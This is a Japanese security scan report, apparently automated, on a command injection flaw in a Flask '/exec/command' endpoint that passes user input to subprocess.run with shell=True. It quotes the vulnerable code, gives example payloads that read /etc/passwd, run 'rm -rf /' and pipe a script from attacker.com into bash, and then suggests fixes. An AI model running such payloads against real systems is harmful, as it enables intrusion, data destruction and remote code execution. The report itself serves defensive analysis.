# Security Analysis: api.py - Process execution resource

## ファイル情報

- **ファイルパス**: `repo/api.py`
- **検出パターン**: Process execution resource

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 95**

## 脆弱性タイプ

- `RCE`

## PAR Policy Analysis

## マッチしたソースコード

```code
subprocess.run
```

## 詳細解析

## リモートコード実行（RCE）脆弱性

### 脆弱性の詳細
エンドポイント `/exec/command` （178-200行目）では、ユーザーから入力された `command` パラメータが何の検証・サニタイズもなく、`subprocess.run()` に直接渡されています。

### 脆弱なコード
```python
@api_bp.route('/exec/command', methods=['POST'])
def execute_command():
    """Command injection vulnerability"""
    data = request.get_json()
    command = data.get('command', '')  # ← untrusted input
    
    try:
        result = subprocess.run(
            command,                    # ← 直接コマンド実行
            shell=True,                # ← シェルメタキャラクタが解釈される
            capture_output=True, 
            text=True,
            timeout=10
        )
        ...
```

### PAR分析

**Principal（主体）**: ユーザーからのPOSTリクエスト（`command` パラメータ）

**Action（制御）**: 入力値に対する検証・サニタイズが存在しない

**Resource（リソース）**: OS コマンド実行（`subprocess.run()`）

### 攻撃シナリオ

攻撃者は以下のようなペイロードを送信することで、任意のOSコマンドを実行できます：

```json
{
  "command": "cat /etc/passwd; rm -rf /"
}
```

または、シェルメタキャラクタを使用した複数コマンド実行：

```json
{
  "command": "whoami && id && curl http://attacker.com/shell.sh | bash"
}
```

### 影響範囲
- サーバー上の任意のコマンド実行
- ファイルシステムへのアクセス・改変・削除
- 他システムへの横展開
- データ盗聴・改ざん

### 根本原因

1. `shell=True` の使用により、シェルメタキャラクタ（`;`, `|`, `&&`, `||` など）が解釈される
2. ユーザー入力に対する検証が一切存在しない
3. コマンドホワイトリスト、入力制限、サンドボックス化などの対策がない

### 推奨される修正

1. **シェルを使用しない**：
   ```python
   subprocess.run(command.split(), shell=False)
   ```

2. **ホワイトリスト検証**：
   ```python
   allowed_commands = ['ls', 'pwd', 'whoami']
   if command not in allowed_commands:
       return jsonify({'error': 'Command not allowed'}), 403
   ```

3. **入力長制限とキャラクタ制限**：
   ```python
   if len(command) > 100 or not command.isalnum():
       return jsonify({'error': 'Invalid command'}), 400
   ```

4. **権限最小化**：
   - Pythonプロセスを専用の低権限ユーザーで実行
   - 機能別のコンテナ化・サンドボックス化


